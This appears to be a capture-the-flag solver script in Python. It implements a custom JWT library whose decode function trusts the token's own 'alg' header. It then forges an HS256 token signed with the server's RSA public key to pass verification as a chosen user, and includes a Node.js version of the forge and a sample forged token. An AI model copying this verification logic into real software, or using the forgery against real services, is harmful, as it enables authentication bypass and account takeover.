import base64
import json
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import padding


possible_algorithms = ["HS256", "RS256"]


def base64url_encode(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=")


def base64url_decode(value):
    value += b"=" * (4 - len(value) % 4)
    return base64.urlsafe_b64decode(value)


def encode(payload, secret, algorithm=None):
    if not algorithm or algorithm not in possible_algorithms:
        raise ValueError("invalid algorithm")
    header = {"typ": "JWT", "alg": algorithm}
    b64header = base64url_encode(json.dumps(header).encode())
    b64payload = base64url_encode(json.dumps(payload).encode())
    if algorithm == "HS256":
        h = hmac.HMAC(secret, hashes.SHA256())
        h.update(b".".join([b64header, b64payload]))
        signature = h.finalize()
    elif algorithm == "RS256":
        priv = serialization.load_pem_private_key(
            secret, password=None, backend=default_backend()
        )
        signature = priv.sign(
            b".".join([b64header, b64payload]),
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256(),
        )
    return b".".join([b64header, b64payload, base64url_encode(signature)])


def decode(token, secret, algorithms=None):
    if not algorithms or any(alg not in possible_algorithms for alg in algorithms):
        return None
    if token.count(b".") != 2:
        return None

    header, payload, signature = token.split(b".")
    if not header or not payload or not signature:
        return None
    try:
        json_header = json.loads(base64url_decode(header))
        json_payload = json.loads(base64url_decode(payload))
        decoded_signature = base64url_decode(signature)
        alg_to_use = json_header["alg"]
        if alg_to_use == "HS256":
            h = hmac.HMAC(secret, hashes.SHA256())
            h.update(b".".join([header, payload]))
            h.verify(decoded_signature)
        elif alg_to_use == "RS256":
            pub = serialization.load_pem_public_key(secret)
            pub.verify(
                decoded_signature,
                b".".join([header, payload]),
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH,
                ),
                hashes.SHA256(),
            )
        return json_payload
    except Exception as e:
        print(e)
        return None

# Referensi
# https://github.com/karma9874/CTF-Writeups/blob/master/Dark-PreCTF/Web-3.md

# Solver in Node JS
# const jwt = require('jsonwebtoken')
# var fs = require('fs')
# var publicKey = fs.readFileSync('server/static/public_key.pem');
# token = jwt.sign({'id': 'b4ddbcad-99b1-49e0-a309-87c5356cb3a2', 'username': 'banua', 'year': '1969'}, publicKey, {algorithm: 'HS256', noTimestamp:true})

# Solver for verify
public_key = open("server/static/public_key.pem", "rb").read()
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImI0ZGRiY2FkLTk5YjEtNDllMC1hMzA5LTg3YzUzNTZjYjNhMiIsInVzZXJuYW1lIjoiYmFudWEiLCJ5ZWFyIjoiMTk2OSJ9.LYYgolkQ8IVUst_cKyLf34HvFkfcBs1RxJbaIGQ6Yoc".encode()
print(decode(token, public_key, algorithms=["HS256", "RS256"]))
